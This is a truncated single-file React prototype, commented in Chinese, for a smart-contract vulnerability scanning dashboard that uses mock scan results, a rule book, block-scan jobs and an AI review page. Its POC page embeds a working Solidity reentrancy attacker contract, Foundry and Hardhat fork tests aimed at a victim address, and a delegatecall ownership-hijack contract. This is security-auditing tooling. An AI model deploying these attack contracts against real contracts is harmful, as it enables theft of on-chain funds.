import React, { useEffect, useMemo, useState } from "react";
import {
  LineChart,
  Line,
  XAxis,
  YAxis,
  Tooltip,
  ResponsiveContainer,
  PieChart,
  Pie,
  Cell,
  Legend,
  BarChart,
  Bar,
} from "recharts";

// 单文件 React 原型（Tailwind + Recharts）。
// 本版新增：
// 1) 区块扫描（按网络 + 区块高度区间 / 持续扫描）与“进度条 + ETA + 暂停/继续/完成”演示。
// 2) AI 复查页：可配置 Ollama Endpoint/Model/Prompt，基于当前扫描假数据生成“AI 复核报告（演示）”。
// 3) 设置页增加 AI 配置项；Tests 新增对区块扫描与 AI 配置的断言。
// 4) 仍保留仪表盘、创建扫描、扫描结果、规则库等页面。

// --- 假数据：扫描结果 ---
const seedScans = [
  {
    id: "SCAN-20251028-001",
    targetType: "address",
    target: "0xAbC7...91f2",
    network: "Sepolia",
    createdAt: "2025-10-28 20:46",
    status: "vuln",
    libs: ["openzeppelin@4.9.5"],
    summary: { high: 2, medium: 3, low: 1 },
    notes: "基于已验证源码 + OpenZeppelin 对比，发现关键修饰器被删除。",
    findings: [
      {
        id: "F-001",
        severity: "High",
        title: "缺失访问控制修饰器（onlyOwner/onlyRole）",
        ruleId: "AC-MOD-001",
        details:
          "检测到仓库参考实现ERC20Burnable中函数 burnFrom 应包含 onlyOwner 或 AccessControl role 校验；当前合约版本中被移除。",
        evidence:
          "AST Diff 显示函数修饰器列表减少：[-onlyRole(MINTER_ROLE)]。控制流中无等价 require。",
        suggestions: [
          "恢复 onlyRole/onlyOwner 修饰器或添加等价 require 校验",
          "为相关函数增加最小权限角色，并在构造函数中正确授权"
        ]
      },
      {
        id: "F-002",
        severity: "High",
        title: "可重入风险（withdraw）",
        ruleId: "RE-ENT-001",
        details:
          "检测到外部可调用函数 withdraw 在 CALL 之后对关键 state 变量进行写入（SSTORE），且未使用 ReentrancyGuard 或 Checks-Effects-Interactions。",
        evidence:
          "CFG: Block#12 -> CALL(gas:2300, to:msg.sender); Followed by SSTORE(balance[msg.sender])",
        suggestions: [
          "引入 ReentrancyGuard 并为函数添加 nonReentrant",
          "调整为 Effects-Interactions 顺序；或使用 pull payment 模式"
        ]
      },
      {
        id: "F-003",
        severity: "Medium",
        title: "输入未校验（参数上限缺失）",
        ruleId: "IN-VAL-002",
        details:
          "mint/airdrop 等函数对 amount 未设置上限，且缺少速率限制，可能导致经济模型被破坏。",
        evidence: "未发现 require(amount <= cap); 未发现速率限制变量更新。",
        suggestions: [
          "设置 cap 并记录已发行总量",
          "引入速率限制或者基于时间的阈值"
        ]
      }
    ],
    poc: {
      generated: true,
      tool: "Foundry + Anvil",
      gist:
        "使用攻击合约在 fallback 中递归调用 withdraw，复现双花提现，攻击 3 次后余额为 0。",
      logs: [
        "anvil --fork-url $SEPOLIA_RPC --block 6942000",
        "forge test -m test_reentrancy",
        "✓ exploit: drained 1.02 ETH from Victim (150ms)"
      ]
    }
  },
  {
    id: "SCAN-20251027-002",
    targetType: "solidity",
    target: "ERC721Market.sol (uploaded)",
    network: "local",
    createdAt: "2025-10-27 14:02",
    status: "safe",
    libs: ["openzeppelin@4.8.3"],
    summary: { high: 0, medium: 0, low: 2 },
    notes: "未发现高风险；建议开启断路器 Pausable。",
    findings: [
      {
        id: "F-101",
        severity: "Low",
        title: "事件缺失（重要状态变更）",
        ruleId: "EV-LOG-001",
        details:
          "上架/下架未发出事件，影响合约可观测性与审计追踪。",
        evidence: "未检测到 emit ListingCreated/ListingCancelled。",
        suggestions: ["添加标准化事件并在前端订阅"]
      },
      {
        id: "F-102",
        severity: "Low",
        title: "价格输入边界模糊",
        ruleId: "IN-VAL-003",
        details: "建议对 price>0、币种白名单等进行显式校验。",
        evidence: "require/if 边界校验缺失。",
        suggestions: ["添加 require(price>0)", "限定接受的代币地址"]
      }
    ],
    poc: { generated: false, tool: null, gist: null, logs: [] }
  },
  {
    id: "SCAN-20251024-003",
    targetType: "bytecode",
    target: "0x60035af3... (bytecode)",
    network: "Unknown",
    createdAt: "2025-10-24 09:31",
    status: "vuln",
    libs: [],
    summary: { high: 1, medium: 2, low: 0 },
    notes: "字节码层面检测到 delegatecall 至动态地址，疑似代理实现不安全。",
    findings: [
      {
        id: "F-201",
        severity: "High",
        title: "不安全的 DELEGATECALL 目标",
        ruleId: "DELEG-001",
        details:
          "检测到根据 calldata 偏移计算出的自由地址作为 DELEGATECALL 目标，缺少固定实现槽位（EIP-1967）保护。",
        evidence: "JUMPI -> PUSH calldataload(0x44) -> DELEGATECALL",
        suggestions: [
          "遵循 EIP-1967 或 UUPS，固定实现槽位并限制升级权限",
          "在 fallback 中严格过滤函数选择子，避免任意 delegatecall"
        ]
      },
      {
        id: "F-202",
        severity: "Medium",
        title: "算术风险（编译器 <0.8.0）",
        ruleId: "ARITH-001",
        details: "通过元数据推断编译器版本 <0.8.0，未发现 SafeMath 或等价保护。",
        evidence: "无 panic opcode，SSTORE 前缺少边界检查。",
        suggestions: ["升级编译器 >=0.8.0 或引入 SafeMath"]
      }
    ],
    poc: {
      generated: true,
      tool: "Foundry",
      gist: "构造动态实现地址，触发 delegatecall 劫持存储，夺取所有者权限。",
      logs: [
        "forge test -m test_delegatecall_hijack",
        "✓ exploit: owner changed to attacker (98ms)"
      ]
    }
  }
];

// --- 假数据：规则库 ---
const ruleBook = [
  { id: "AC-MOD-001", name: "访问控制修饰器缺失/绕过", severity: "High", pattern: "AST: missing modifier or require on external state-changing func" },
  { id: "RE-ENT-001", name: "可重入", severity: "High", pattern: "CFG: CALL before SSTORE without guard" },
  { id: "DELEG-001", name: "不安全的delegatecall", severity: "High", pattern: "EVM: dynamic target from calldata" },
  { id: "SUIC-001", name: "SELFDESTRUCT 滥用", severity: "High", pattern: "SELFDESTRUCT reachable by unprivileged caller" },
  { id: "TXOR-001", name: "Tx.Origin 认证", severity: "Medium", pattern: "uses tx.origin for auth" },
  { id: "ARITH-001", name: "算术溢出/下溢(旧编译器)", severity: "Medium", pattern: "no safemath and <0.8.0" },
  { id: "FRONT-001", name: "价格操纵/预言机风险", severity: "Medium", pattern: "reads from AMM without TWAP" },
  { id: "DOS-001", name: "拒绝服务(昂贵循环)", severity: "Low", pattern: "unbounded loop over storage" },
  { id: "EV-LOG-001", name: "关键事件缺失", severity: "Low", pattern: "no event on state change" },
  { id: "IN-VAL-003", name: "输入边界不清", severity: "Low", pattern: "missing require on value range" }
];

// --- 假数据：区块扫描任务 ---
const seedBlockJobs = [
  {
    id: "JOB-20251030-001",
    network: "Sepolia",
    startBlock: 6942000,
    endBlock: 6945000,
    continuous: false,
    status: "running", // running/paused/done/cancelled
    processed: 1500,
    total: 3001,
    findings: { high: 1, medium: 2, low: 3 },
    startedAt: "2025-10-30 15:10",
    speed: 45 // blocks/s (演示)
  },
  {
    id: "JOB-20251030-002",
    network: "Ethereum",
    startBlock: 21000000,
    endBlock: null,
    continuous: true,
    status: "running",
    processed: 800,
    total: null,
    findings: { high: 0, medium: 1, low: 2 },
    startedAt: "2025-10-30 15:20",
    speed: 30
  }
];

function StatCard({ title, value, sub }) {
  return (
    <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
      <div className="text-sm text-zinc-400">{title}</div>
      <div className="text-3xl font-semibold mt-1">{value}</div>
      {sub && <div className="text-xs text-zinc-500 mt-1">{sub}</div>}
    </div>
  );
}

function Badge({ children, tone = "zinc" }) {
  const tones = {
    green: "bg-green-500/10 text-green-400 border-green-500/20",
    red: "bg-red-500/10 text-red-400 border-red-500/20",
    yellow: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
    blue: "bg-blue-500/10 text-blue-400 border-blue-500/20",
    purple: "bg-purple-500/10 text-purple-400 border-purple-500/20",
    zinc: "bg-zinc-700/30 text-zinc-300 border-zinc-600/30"
  };
  return (
    <span className={`px-2 py-0.5 rounded-full text-xs border ${tones[tone]}`}>{children}</span>
  );
}

function SeverityPill({ sev }) {
  const m = {
    High: { label: "High", tone: "red" },
    Medium: { label: "Medium", tone: "yellow" },
    Low: { label: "Low", tone: "blue" },
    Safe: { label: "Safe", tone: "green" }
  }[sev] || { label: sev, tone: "zinc" };
  return <Badge tone={m.tone}>{m.label}</Badge>;
}

// 简易自检（最小测试用例）
function runSelfTests(scans, selected, blockJobs, aiConfig) {
  const tests = [];
  // 1. problemScans 逻辑
  const onlyVuln = scans.filter((s) => s.status === "vuln");
  const hasOnlyVuln = onlyVuln.every((s) => s.status === "vuln");
  tests.push({ name: "筛选仅存在问题的扫描", pass: hasOnlyVuln, details: `vulnCount=${onlyVuln.length}` });

  // 2. 严重等级非负
  const t = scans.reduce((a, s) => ({ h: a.h + s.summary.high, m: a.m + s.summary.medium, l: a.l + s.summary.low }), { h: 0, m: 0, l: 0 });
  const totalsOk = t.h >= 0 && t.m >= 0 && t.l >= 0;
  tests.push({ name: "严重等级计数非负", pass: totalsOk, details: `H=${t.h},M=${t.m},L=${t.l}` });

  // 3. 趋势排序
  const dates = Array.from(new Set(scans.map((s) => (s.createdAt || "").split(" ")[0])));
  const sorted = [...dates].sort();
  tests.push({ name: "趋势日期排序", pass: JSON.stringify([...dates].sort()) === JSON.stringify(sorted), details: `${sorted.join(",")}` });

  // 4. POC 日志 join("\n")
  const logs = selected?.poc?.logs || [];
  const joined = logs.join("\n");
  const joinOk = logs.length <= 1 || joined.includes("\n");
  tests.push({ name: "POC 日志换行 join(\n)", pass: joinOk, details: `lines=${logs.length}` });

  // 5. 区块扫描：非持续任务百分比范围
  const bounded = blockJobs.filter((j) => !j.continuous && j.total);
  const pctOk = bounded.every((j) => j.processed >= 0 && j.processed <= j.total);
  tests.push({ name: "区块扫描百分比范围(0..100)", pass: pctOk, details: `boundedJobs=${bounded.length}` });

  // 6. AI 配置存在
  const aiOk = !!aiConfig && !!aiConfig.endpoint && !!aiConfig.model;
  tests.push({ name: "AI 配置存在", pass: aiOk, details: `${aiConfig?.endpoint || ""} · ${aiConfig?.model || ""}` });

  // 7. 持续扫描 total 为空
  const contJobs = blockJobs.filter((j) => j.continuous);
  const contOk = contJobs.every((j) => j.total === null);
  tests.push({ name: "持续扫描 total 为 null", pass: contOk, details: `continuousJobs=${contJobs.length}` });

  return tests;
}

export default function App() {
  const [tab, setTab] = useState("dashboard");
  const [scans, setScans] = useState(seedScans);
  const [selected, setSelected] = useState(seedScans[0]);

  // 区块扫描任务
  const [blockJobs, setBlockJobs] = useState(seedBlockJobs);

  // AI 复查配置
  const [aiConfig, setAiConfig] = useState({
    enabled: true,
    endpoint: "http://localhost:11434",
    model: "llama3.1",
    prompt: `你是一名智能合约安全审计助手。\n基于以下扫描器发现，输出复核意见：\n1) 可能误报项\n2) 严重性调整建议\n3) 可复现实验建议/POC 要点\n请用中文给出要点式结论。`
  });

  // 统计数据
  const totals = useMemo(() => {
    const all = scans.reduce(
      (acc, s) => {
        acc.h += s.summary.high;
        acc.m += s.summary.medium;
        acc.l += s.summary.low;
        acc.vuln += s.status === "vuln" ? 1 : 0;
        return acc;
      },
      { h: 0, m: 0, l: 0, vuln: 0 }
    );
    return all;
  }, [scans]);

  // 仪表盘图表数据（按日期统计）
  const trendData = useMemo(() => {
    const map = new Map();
    scans.forEach((s) => {
      const d = (s.createdAt || "").split(" ")[0];
      if (!map.has(d)) map.set(d, { date: d, total: 0, vuln: 0, safe: 0 });
      const o = map.get(d);
      o.total += 1;
      if (s.status === "vuln") o.vuln += 1; else o.safe += 1;
    });
    return Array.from(map.values()).sort((a, b) => (a.date > b.date ? 1 : -1));
  }, [scans]);

  const pieData = useMemo(() => [
    { name: "High", value: totals.h },
    { name: "Medium", value: totals.m },
    { name: "Low", value: totals.l },
  ], [totals]);

  const pieColors = ["#ef4444", "#f59e0b", "#3b82f6"]; // red/yellow/blue

  // 可选项（类型、网络）
  const allNetworks = Array.from(new Set(scans.map((s) => s.network).concat(blockJobs.map((j) => j.network))));
  const allRuleIds = Array.from(new Set(scans.flatMap((s) => s.findings.map((f) => f.ruleId))));

  // 问题扫描筛选
  const [fltSev, setFltSev] = useState("ALL");
  const [fltRule, setFltRule] = useState("ALL");
  const [fltNet, setFltNet] = useState("ALL");

  const problemScans = useMemo(() => {
    const list = scans.filter((s) => s.status === "vuln");
    return list.filter((s) => {
      const byNet = fltNet === "ALL" || s.network === fltNet;
      const byFinding = s.findings.some((f) => {
        const sevOk = fltSev === "ALL" || f.severity === fltSev;
        const ruleOk = fltRule === "ALL" || f.ruleId === fltRule;
        return sevOk && ruleOk;
      });
      return byNet && byFinding;
    });
  }, [scans, fltSev, fltRule, fltNet]);

  // 区块扫描：模拟进度更新（演示）
  useEffect(() => {
    const t = setInterval(() => {
      setBlockJobs((prev) =>
        prev.map((job) => {
          if (job.status !== "running") return job;
          const inc = Math.floor(Math.random() * 60) + 20; // 每秒 20~79 块（演示）
          const newProcessed = job.processed + inc;
          const newSpeed = Math.round((job.speed * 3 + inc) / 4);
          let status = job.status;
          let processed = newProcessed;
          if (job.total && newProcessed >= job.total) {
            processed = job.total;
            status = "done";
          }
          const addFinding = () => (Math.random() < 0.03 ? 1 : 0); // 3% 几率
          const newFindings = {
            high: job.findings.high + addFinding(),
            medium: job.findings.medium + addFinding(),
            low: job.findings.low + addFinding()
          };
          return { ...job, processed, status, speed: newSpeed, findings: newFindings };
        })
      );
    }, 1000);
    return () => clearInterval(t);
  }, []);

  // 自检结果（设置页展示）
  const selfTests = useMemo(() => runSelfTests(scans, selected, blockJobs, aiConfig), [scans, selected, blockJobs, aiConfig]);

  function Row({ s }) {
    return (
      <tr
        className="hover:bg-zinc-800/40 cursor-pointer"
        onClick={() => {
          setSelected(s);
          setTab("results");
        }}
      >
        <td className="px-3 py-2 font-mono text-zinc-300">{s.id}</td>
        <td className="px-3 py-2">
          <div className="flex items-center gap-2">
            <Badge tone="blue">{s.targetType}</Badge>
            <span className="font-mono text-zinc-300">{s.target}</span>
          </div>
        </td>
        <td className="px-3 py-2 text-zinc-300">{s.network}</td>
        <td className="px-3 py-2 text-zinc-400">{s.createdAt}</td>
        <td className="px-3 py-2">
          {s.status === "safe" ? (
            <Badge tone="green">安全</Badge>
          ) : (
            <Badge tone="red">存在漏洞</Badge>
          )}
        </td>
        <td className="px-3 py-2 text-zinc-300">
          H:{s.summary.high} / M:{s.summary.medium} / L:{s.summary.low}
        </td>
      </tr>
    );
  }

  // 结果页 - 漏洞项（纵向列表 + 展开）
  function FindingItem({ f }) {
    const [open, setOpen] = useState(false);
    return (
      <div className="p-4 rounded-2xl bg-black/20 border border-zinc-800">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <SeverityPill sev={f.severity} />
            <div className="font-semibold">{f.title}</div>
            <Badge tone="purple">{f.ruleId}</Badge>
          </div>
          <button
            className="text-sm px-3 py-1 rounded-lg bg-zinc-800 border border-zinc-700 hover:bg-zinc-700"
            onClick={() => setOpen((v) => !v)}
          >
            {open ? "收起" : "查看详情"}
          </button>
        </div>
        {open && (
          <div className="mt-3 space-y-2 text-sm text-zinc-300">
            <div>
              <div className="text-zinc-400 text-xs">细节</div>
              <p className="mt-1 leading-relaxed">{f.details}</p>
            </div>
            <div>
              <div className="text-zinc-400 text-xs">证据</div>
              <pre className="mt-1 bg-black/30 p-2 rounded-lg border border-zinc-800 whitespace-pre-wrap">{f.evidence}</pre>
            </div>
            <div>
              <div className="text-zinc-400 text-xs">修复建议</div>
              <ul className="list-disc pl-5 mt-1 space-y-1">
                {f.suggestions.map((s, i) => (
                  <li key={i}>{s}</li>
                ))}
              </ul>
            </div>
          </div>
        )}
      </div>
    );
  }

  // 工具函数
  function fmtETA(job) {
    if (!job.total || job.continuous || job.status !== "running") return "--";
    const remain = Math.max(0, job.total - job.processed);
    if (!job.speed) return "--";
    const sec = Math.round(remain / job.speed);
    const mm = String(Math.floor(sec / 60)).padStart(2, "0");
    const ss = String(sec % 60).padStart(2, "0");
    return `${mm}:${ss}`;
  }

  function percent(job) {
    if (!job.total || job.continuous) return null;
    return Math.min(100, Math.round((job.processed / job.total) * 100));
  }

  // POC 模板（保持上一版）
  const [pocScene, setPocScene] = useState("Reentrancy");
  const [victimAddr, setVictimAddr] = useState("0xVictim...dead");
  const [attackerAddr, setAttackerAddr] = useState("0xAttacker...beef");

  const pocTemplates = useMemo(() => {
    const scenes = {
      Reentrancy: {
        desc: "重入攻击：生成带 fallback 的攻击合约 + 测试代码，支持 Foundry/Hardhat。",
        attackSol: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
interface IVictim { function deposit() external payable; function withdraw(uint256) external; }
contract ReentrancyAttacker {
  IVictim public victim; address public owner;
  constructor(address _victim) { victim = IVictim(_victim); owner = msg.sender; }
  receive() external payable { if (address(victim).balance >= 0.1 ether) { victim.withdraw(0.1 ether); } }
  function attack() external payable { require(msg.sender==owner); victim.deposit{value: 0.1 ether}(); victim.withdraw(0.1 ether); }
}`,
        foundryTest: `// Foundry test (test/reentrancy.t.sol)
// forge test -m test_reentrancy --fork-url $SEPOLIA_RPC --fork-block-number 6942000
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
interface IVictim { function deposit() external payable; function withdraw(uint256) external; }
contract TestReentrancy is Test {
  function test_reentrancy() public {
    address victim = ${"`"}${victimAddr}${"`"};
    ReentrancyAttacker attacker = new ReentrancyAttacker(victim);
    vm.deal(address(attacker), 1 ether);
    vm.prank(address(0xBEEF));
    attacker.attack{value: 0.1 ether}();
    // 断言：Victim 余额下降等条件...
  }
}
`,
        hardhatTest: `// Hardhat test (test/reentrancy.spec.ts)
// anvil --fork-url $SEPOLIA_RPC --block 6942000
import { ethers } from "hardhat";
describe("reentrancy", () => {
  it("exploit", async () => {
    const victim = ${"`"}${victimAddr}${"`"};
    const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
    const attacker = await Attacker.deploy(victim);
    await attacker.deployed();
    await attacker.attack({ value: ethers.utils.parseEther("0.1") });
  });
});
`,
      },
      DelegatecallHijack: {
        desc: "delegatecall 劫持：构造恶意实现并利用不安全 fallback。",
        attackSol: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
contract EvilImpl { address public owner; function hijack() external { owner = msg.sender; } }
`,
        foundryTest: `// Foundry test skeleton for delegatecall hijack
pragma solidity ^0.8.24;
contract TestDelegateHijack {/* 根据目标合约接口填充 */}
`,
        hardhatTest: `// Hardhat test skeleton for delegatecall hijack
// TODO: 根据代理布局与实现插槽补全
`,
      },
    };
    return scenes[pocScene];
  }, [pocScene, victimAddr]);

  // AI 复查（演示）：根据当前选中扫描生成摘要
  const [aiOutput, setAiOutput] = useState("");
  function runAiReview() {
    if (!aiConfig.enabled) {
      setAiOutput("AI 复查未启用。");
      return;
    }
    if (!selected) {
      setAiOutput("没有选中的扫描结果。");
      return;
    }
    const lines = [];
    lines.push(`模型: ${aiConfig.model} (endpoint: ${aiConfig.endpoint})`);
    lines.push("—— 输入（扫描器发现）摘要 ——");
    selected.findings.forEach((f, i) => {
      lines.push(`${i + 1}. [${f.severity}] ${f.title} · ${f.ruleId}`);
    });
    lines.push("—— AI（模拟）复核意见 ——");
    // 简单规则：把 Medium 里含 “输入未校验/边界” 的条目标记为可降级
    const downgrade = selected.findings.filter((f) => f.severity === "Medium" && /未校验|边界/.test(f.title)).map((f) => f.ruleId);
    if (downgrade.length) lines.push(`可考虑降级：${downgrade.join(", ")}`);
    if (selected.findings.some((f) => f.ruleId === "RE-ENT-001")) {
      lines.push("建议生成/运行重入 POC：使用 Foundry，设置最小重入深度 2，并断言余额差异。");
    }
    lines.push("建议补充：对关键路径添加事件日志与访问控制单元测试。");
    setAiOutput(lines.join("\n"));
  }

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-100 p-6">
      <div className="max-w-7xl mx-auto">
        <header className="flex items-center justify-between">
          <h1 className="text-2xl font-semibold">智能合约漏洞检测平台 · 原型（v3）</h1>
          <nav className="flex gap-2">
            {[
              { id: "dashboard", name: "仪表盘" },
              { id: "new", name: "创建扫描" },
              { id: "blockscan", name: "区块扫描" },
              { id: "results", name: "扫描结果" },
              { id: "poc", name: "POC & 模拟" },
              { id: "ai", name: "AI 复查" },
              { id: "rules", name: "规则库" },
              { id: "settings", name: "设置" }
            ].map((t) => (
              <button
                key={t.id}
                onClick={() => setTab(t.id)}
                className={`px-3 py-1.5 rounded-xl border transition ${
                  tab === t.id
                    ? "bg-zinc-800 border-zinc-700"
                    : "bg-zinc-900/40 border-zinc-800 hover:bg-zinc-800/40"
                }`}
              >
                {t.name}
              </button>
            ))}
          </nav>
        </header>

        {/* 仪表盘（保持） */}
        {tab === "dashboard" && (
          <section className="mt-6 space-y-6">
            <div className="grid md:grid-cols-4 gap-4">
              <StatCard title="历史扫描总数" value={scans.length} sub="address/solidity/bytecode 混合" />
              <StatCard title="存在问题的扫描" value={totals.vuln} sub="status=vuln" />
              <StatCard title="高危总数" value={totals.h} sub="规则命中 High" />
              <StatCard title="中/低危总数" value={`${totals.m} / ${totals.l}`} sub="Medium / Low" />
            </div>

            <div className="grid md:grid-cols-3 gap-4">
              <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800 md:col-span-2">
                <div className="flex items-center justify-between">
                  <h3 className="font-semibold">扫描趋势（按日）</h3>
                  <Badge>假数据</Badge>
                </div>
                <div className="h-56 mt-2">
                  <ResponsiveContainer width="100%" height="100%">
                    <LineChart data={trendData}>
                      <XAxis dataKey="date" stroke="#a1a1aa" />
                      <YAxis stroke="#a1a1aa" />
                      <Tooltip />
                      <Legend />
                      <Line type="monotone" dataKey="total" name="总数" stroke="#94a3b8" strokeWidth={2} dot={false} />
                      <Line type="monotone" dataKey="vuln" name="有问题" stroke="#ef4444" strokeWidth={2} dot={false} />
                      <Line type="monotone" dataKey="safe" name="安全" stroke="#22c55e" strokeWidth={2} dot={false} />
                    </LineChart>
                  </ResponsiveContainer>
                </div>
              </div>

              <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
                <h3 className="font-semibold">严重等级占比</h3>
                <div className="h-56 mt-2">
                  <ResponsiveContainer width="100%" height="100%">
                    <PieChart>
                      <Pie data={pieData} dataKey="value" nameKey="name" outerRadius={80}>
                        {pieData.map((entry, index) => (
                          <Cell key={`cell-${index}`} fill={pieColors[index % pieColors.length]} />
                        ))}
                      </Pie>
                      <Tooltip />
                      <Legend />
                    </PieChart>
                  </ResponsiveContainer>
                </div>
              </div>
            </div>

            {/* 有问题的扫描 + 筛选 */}
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <div className="flex items-center justify-between gap-3 flex-wrap">
                <h3 className="font-semibold">有问题的扫描</h3>
                <div className="flex items-center gap-2 text-sm">
                  <select value={fltSev} onChange={(e) => setFltSev(e.target.value)} className="px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg">
                    <option value="ALL">所有等级</option>
                    <option value="High">High</option>
                    <option value="Medium">Medium</option>
                    <option value="Low">Low</option>
                  </select>
                  <select value={fltRule} onChange={(e) => setFltRule(e.target.value)} className="px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg">
                    <option value="ALL">所有类型</option>
                    {allRuleIds.map((r) => (
                      <option key={r} value={r}>{r}</option>
                    ))}
                  </select>
                  <select value={fltNet} onChange={(e) => setFltNet(e.target.value)} className="px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg">
                    <option value="ALL">所有网络</option>
                    {allNetworks.map((n) => (
                      <option key={n} value={n}>{n}</option>
                    ))}
                  </select>
                </div>
              </div>
              <div className="overflow-auto mt-3">
                <table className="w-full text-sm border-separate border-spacing-y-1">
                  <thead className="text-zinc-400">
                    <tr>
                      <th className="text-left px-3 py-2">ID</th>
                      <th className="text-left px-3 py-2">目标</th>
                      <th className="text-left px-3 py-2">网络</th>
                      <th className="text-left px-3 py-2">时间</th>
                      <th className="text-left px-3 py-2">摘要</th>
                    </tr>
                  </thead>
                  <tbody>
                    {problemScans.map((s) => (
                      <tr key={s.id} className="hover:bg-zinc-800/40 cursor-pointer" onClick={() => { setSelected(s); setTab("results"); }}>
                        <td className="px-3 py-2 font-mono text-zinc-300">{s.id}</td>
                        <td className="px-3 py-2">
                          <div className="flex items-center gap-2">
                            <Badge tone="blue">{s.targetType}</Badge>
                            <span className="font-mono text-zinc-300">{s.target}</span>
                          </div>
                        </td>
                        <td className="px-3 py-2 text-zinc-300">{s.network}</td>
                        <td className="px-3 py-2 text-zinc-400">{s.createdAt}</td>
                        <td className="px-3 py-2 text-zinc-300">H:{s.summary.high} / M:{s.summary.medium} / L:{s.summary.low}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            {/* 最近扫描（全部） */}
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <div className="flex items-center justify-between">
                <h2 className="text-lg font-semibold">最近扫描（全部）</h2>
                <Badge>假数据</Badge>
              </div>
              <div className="overflow-auto mt-3">
                <table className="w-full text-sm border-separate border-spacing-y-1">
                  <thead className="text-zinc-400">
                    <tr>
                      <th className="text-left px-3 py-2">ID</th>
                      <th className="text-left px-3 py-2">目标</th>
                      <th className="text-left px-3 py-2">网络</th>
                      <th className="text-left px-3 py-2">时间</th>
                      <th className="text-left px-3 py-2">状态</th>
                      <th className="text-left px-3 py-2">摘要</th>
                    </tr>
                  </thead>
                  <tbody>
                    {scans.map((s) => (
                      <Row key={s.id} s={s} />
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </section>
        )}

        {/* 创建扫描（单目标） */}
        {tab === "new" && (
          <section className="mt-6 grid md:grid-cols-2 gap-4">
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">通过合约地址</h2>
              <p className="text-sm text-zinc-400 mt-1">示例：Sepolia 上的已验证合约</p>
              <div className="mt-3 grid gap-2">
                <input className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl font-mono" placeholder="0xAbC7...91f2" />
                <select className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl">
                  <option>Sepolia</option>
                  <option>Ethereum</option>
                  <option>BNB Chain</option>
                  <option>Polygon</option>
                </select>
                <button
                  className="px-3 py-2 rounded-xl bg-blue-600 hover:bg-blue-500"
                  onClick={() => alert("原型演示：将创建扫描任务，并自动从 Sourcify/Etherscan 拉取源码，进行库对比与污点分析。")}
                >
                  立即扫描（演示）
                </button>
              </div>
            </div>

            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">上传 Solidity 源码</h2>
              <p className="text-sm text-zinc-400 mt-1">支持多文件；原型仅文本框</p>
              <textarea className="w-full h-40 mt-3 p-3 bg-zinc-950 border border-zinc-800 rounded-xl font-mono" placeholder={"// pragma solidity ^0.8.24;\n// contract Sample { ... }"} />
              <div className="mt-3 flex gap-2">
                <select className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl">
                  <option>solc 0.8.24</option>
                  <option>solc 0.8.20</option>
                  <option>solc 0.7.6</option>
                </select>
                <button
                  className="px-3 py-2 rounded-xl bg-blue-600 hover:bg-blue-500"
                  onClick={() => alert("原型演示：将进行库检测（OpenZeppelin），AST Diff 与规则扫描。")}
                >
                  立即扫描（演示）
                </button>
              </div>
            </div>

            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800 md:col-span-2">
              <h2 className="text-lg font-semibold">粘贴字节码</h2>
              <textarea className="w-full h-24 mt-3 p-3 bg-zinc-950 border border-zinc-800 rounded-xl font-mono" placeholder={"0x6080604052..."} />
              <div className="mt-3 flex gap-2">
                <button
                  className="px-3 py-2 rounded-xl bg-blue-600 hover:bg-blue-500"
                  onClick={() => alert("原型演示：将反汇编为 EVM 指令，构建 CFG/DFG，执行污点追踪与规则匹配。")}
                >
                  立即扫描（演示）
                </button>
              </div>
            </div>
          </section>
        )}

        {/* 区块扫描（网络 + 区块高度区间/持续） */}
        {tab === "blockscan" && (
          <section className="mt-6 grid lg:grid-cols-2 gap-4">
            {/* 创建区块扫描任务 */}
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">创建区块扫描任务</h2>
              <div className="mt-3 grid gap-2 text-sm">
                <label className="flex items-center gap-2">网络
                  <select id="bs-net" className="px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg">
                    {allNetworks.map((n) => (
                      <option key={n} value={n}>{n}</option>
                    ))}
                    {!allNetworks.length && <option>Sepolia</option>}
                  </select>
                </label>
                <label className="flex items-center gap-2">起始区块
                  <input id="bs-start" className="flex-1 px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg font-mono" placeholder="6942000" />
                </label>
                <label className="flex items-center gap-2">结束区块（留空表示持续）
                  <input id="bs-end" className="flex-1 px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg font-mono" placeholder="6945000" />
                </label>
                <label className="flex items-center gap-2">
                  <input id="bs-cont" type="checkbox" className="accent-blue-500" /> 持续扫描（新块追加）
                </label>
                <label className="flex items-center gap-2">并发度
                  <input id="bs-parallel" className="w-24 px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg" placeholder="4" />
                </label>
                <button
                  className="mt-2 px-3 py-2 rounded-xl bg-blue-600 hover:bg-blue-500"
                  onClick={() => {
                    const netEl = document.getElementById("bs-net");
                    const startEl = document.getElementById("bs-start");
                    const endEl = document.getElementById("bs-end");
                    const contEl = document.getElementById("bs-cont");
                    const parEl = document.getElementById("bs-parallel");
                    const network = (netEl && netEl.value) || "Sepolia";
                    const startBlock = parseInt((startEl && startEl.value) || "6942000", 10);
                    const endStr = (endEl && endEl.value) || "";
                    const endBlock = endStr ? parseInt(endStr, 10) : null;
